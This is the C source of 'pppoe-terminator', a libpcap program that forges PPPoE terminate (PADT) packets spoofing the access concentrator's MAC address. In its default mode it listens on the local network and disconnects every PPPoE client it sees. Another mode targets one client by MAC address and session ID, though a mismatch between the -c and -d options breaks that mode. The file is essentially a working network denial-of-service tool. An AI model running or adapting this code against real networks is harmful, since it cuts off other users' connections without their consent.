/*
 * pppoe-terminator v0.2 - terminate PPPoE sessions
 *
 * Copyright (c) 2008-2010, Tibor Bombiak
 *
 * You must compile this program against libpcap. Example:
 * 	gcc -o pppoe-terminator pppoe-terminator.c -lpcap
 *
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 *
 * pppoe-terminator is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, see <http://www.gnu.org/licenses>.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <pcap.h>

#include "pppoe-terminator.h"

char* ether_ntoa(struct ether_addr *ea, char *buf)
{
	sprintf(buf, "%02x:%02x:%02x:%02x:%02x:%02x",
		ea->ether_addr_octet[0]&0xff, ea->ether_addr_octet[1]&0xff, ea->ether_addr_octet[2]&0xff,
		ea->ether_addr_octet[3]&0xff, ea->ether_addr_octet[4]&0xff, ea->ether_addr_octet[5]&0xff);
	return (buf);
}

int ether_atoe(char *p, struct ether_addr *ea)
{
	int i = 0;

	for (;;) {
		ea->ether_addr_octet[i++] = (char) strtoul(p, &p, 16);
		if (!*p++ || i == ETHER_ADDR_LEN)
			break;
	}
	return (i == ETHER_ADDR_LEN);
}

int get_hwaddr(char *dev, struct ether_addr *ea)
{
	int s;
	struct ifreq ifr;

	if ((s = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
	{
		return (0);
	}

	strcpy(ifr.ifr_name, dev);

	if (ioctl(s, SIOCGIFHWADDR, &ifr) == -1)
	{
		close(s);
		return (0);
	}

	close(s);
	memcpy(ea, &ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	return (1);
}

int build_padt_pkt(struct ether_addr *src, struct ether_addr *dst, unsigned int sess_id, PPPoEPacket *packet)
{
	/* Build PPPoE encapsulation */
	memcpy (packet->ethHdr.h_source, src->ether_addr_octet, ETH_ALEN);
	memcpy (packet->ethHdr.h_dest, dst->ether_addr_octet, ETH_ALEN);
	packet->ethHdr.h_proto = htons(ETH_PPPOE_DISCOVERY);
	packet->ver = 0x01;
	packet->type = 0x01;
	packet->code = CODE_PADT;
	packet->session = htons(sess_id);
	packet->length = 0;

	return (PPPOE_HEADERLEN);
}

void usage(char const *argv0)
{
	fprintf(stdout, 
			"Usage: %s -i -a [-c -s -x] [-h]\n"
			"\t-i interface\t -- specify interface to use\n"
			"\t-a ac's mac\t -- access concentrator's mac\n"
			"\t[-c] client's mac\t -- \n"
			"\t[-s] session id\t -- pppoe session id (hex)\n"
			"\t[-x] pkt count\t -- number of padt packets to send (default %d)\n\n"
			"\t[-h] shows this help\n"
			"%s sends PADT packets to/from any discovered client or client defined by MAC if [-c -s] options defined\n\n"
			"%s version %s, copyright(c) 2008 biegleux\n", argv0, DEF_PKTS, argv0, argv0, VERSION);
	exit(1);
}

int pkts = DEF_PKTS;
unsigned int sess_id;
struct ether_addr ac_hwaddr;	/* Access Concentrator's MAC address */
struct ether_addr dev_hwaddr;	/* MAC address of interface we use */
struct ether_addr dst_hwaddr;	/* Client's MAC address */
char *dev_name = NULL;		/* Interface to use */

pcap_t *fp;
char errbuf[PCAP_ERRBUF_SIZE];
struct bpf_program filter;
char filter_exp[] = "pppoes";
bpf_u_int32 mask, net;
int res;
struct pcap_pkthdr *pkt_header;
const u_char *pkt_data;

PPPoEPacket pkt, *packet;
int pkt_len;

void do_kill_user()
{
	int i;

	/* Open the output adapter */
	if ((fp = pcap_open_live(dev_name, 1024, 1, 1000, errbuf)) == NULL)
	{
		fprintf(stderr, "Error opening adapter: %s:\n", errbuf);
		return;
	}

	for (i = 0; i < pkts; i++)
	{
		/* Build PADT packet */
		pkt_len = build_padt_pkt(&ac_hwaddr, &dst_hwaddr, sess_id, &pkt);

		if (pcap_sendpacket(fp, (unsigned char *) &pkt, pkt_len) != 0)
		{
			fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(fp));
			continue;
		}
		usleep(2000);
	}
	pcap_close(fp);
}

void do_kill_all()
{
	/* Getting MAC address */
	if (!get_hwaddr(dev_name, &dev_hwaddr))
	{
		fprintf(stderr, "Unable to obtain MAC address for device %s\n", dev_name);
		return;
	}

	/* Open the output adapter */
	if ((fp = pcap_open_live(dev_name, 1024, 1, 1000, errbuf)) == NULL)
	{
		fprintf(stderr, "Error opening adapter: %s:\n", errbuf);
		return;
	}

	if (pcap_lookupnet(dev_name, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Can't get netmask for device: %s %s\n", dev_name, pcap_geterr(fp));
		net = 0;
		mask = 0;
	}

	if (pcap_compile(fp, &filter, filter_exp, 0, net) == -1)
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(fp));
		return;
	}

	if (pcap_setfilter(fp, &filter) == -1)
	{
		fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(fp));
		return;
	}

	/* Start capturing */

	fprintf(stdout, "Listening...\n");

	while ((res = pcap_next_ex(fp, &pkt_header, &pkt_data)) >= 0)
	{
		if (res == 0)
			/* Timeout elapsed */
			continue;

		packet = (PPPoEPacket *)(pkt_data);

		if (memcmp(packet->ethHdr.h_source, &ac_hwaddr, ETH_ALEN) != 0 && memcmp(packet->ethHdr.h_dest, &ac_hwaddr, ETH_ALEN) != 0)
		{
			/* Skip all traffic not travelling through AC */
			continue;
		}

		if (memcmp(packet->ethHdr.h_source, &ac_hwaddr, ETH_ALEN) == 0)
		{
			memcpy(&dst_hwaddr, packet->ethHdr.h_dest, ETH_ALEN);
		}
		else
		{
			memcpy(&dst_hwaddr, packet->ethHdr.h_source, ETH_ALEN);
		}

		if (memcmp(&dst_hwaddr, &dev_hwaddr, ETH_ALEN) == 0)
		{
			/* Ignore packets somehow related to me */
			continue;
		}

		/* Build PADT packet */
		pkt_len = build_padt_pkt(&ac_hwaddr, &dst_hwaddr, ntohs(packet->session), &pkt);

		fprintf(stdout, "Sending PADT to [%02x:%02x:%02x:%02x:%02x:%02x]\n",
				dst_hwaddr.ether_addr_octet[0], dst_hwaddr.ether_addr_octet[1], dst_hwaddr.ether_addr_octet[2],
				dst_hwaddr.ether_addr_octet[3], dst_hwaddr.ether_addr_octet[4], dst_hwaddr.ether_addr_octet[5]);

		if (pcap_sendpacket(fp, (unsigned char *) &pkt, pkt_len) != 0)
		{
			fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(fp));
			continue;
		}
	}
	pcap_close(fp);
}

int main(int argc, char *argv[])
{
	int c, ret;
	u_char aflag = 0x00;	/* Arguments flag */

	while ((c = getopt (argc, argv, "i:a:c:s:x:h")) != -1)
		switch (c)
		{
		case 'i':
			dev_name = optarg;
			SETFLAG(aflag, I_FLG);
			break;
		case 'a':
			if (!ether_atoe(optarg, &ac_hwaddr))
			{
				fprintf(stderr, "Invalid AC's MAC address.\n");
				return;
			}
			SETFLAG(aflag, A_FLG);
			break;
		case 'd':
			if (!ether_atoe(optarg, &dst_hwaddr))
			{
				fprintf(stderr, "Invalid destination MAC address.\n");
				return;
			}
			SETFLAG(aflag, D_FLG);
			break;
		case 's':
			ret = sscanf(optarg, "%x", &sess_id);
			if (ret != 1)
			{
				fprintf(stderr, "Invalid PPPoE session id.\n");
				return;
			}
			SETFLAG(aflag, S_FLG);
			break;
		case 'x':
			ret = sscanf(optarg, "%d", &pkts);
			if (pkts < 1 || pkts > MAX_PKTS || ret != 1)
			{
				fprintf(stderr, "Invalid number of packets. [1-200]\n");
				return;
			}
			break;
		case 'h':
			usage(argv[0]);
			break;
		default:
			usage(argv[0]);
		}

	/* Check the validity of the command line */
	if (!GETFLAG(aflag, I_FLG) || !GETFLAG(aflag, A_FLG))
		usage(argv[0]);

	c = GETFLAG(aflag, D_FLG) + GETFLAG(aflag, S_FLG);
	switch (c)
	{
		case 0:
			do_kill_all();
			break;
		case 2:
			do_kill_user();
			break;
		default:
			usage(argv[0]);
	}
}
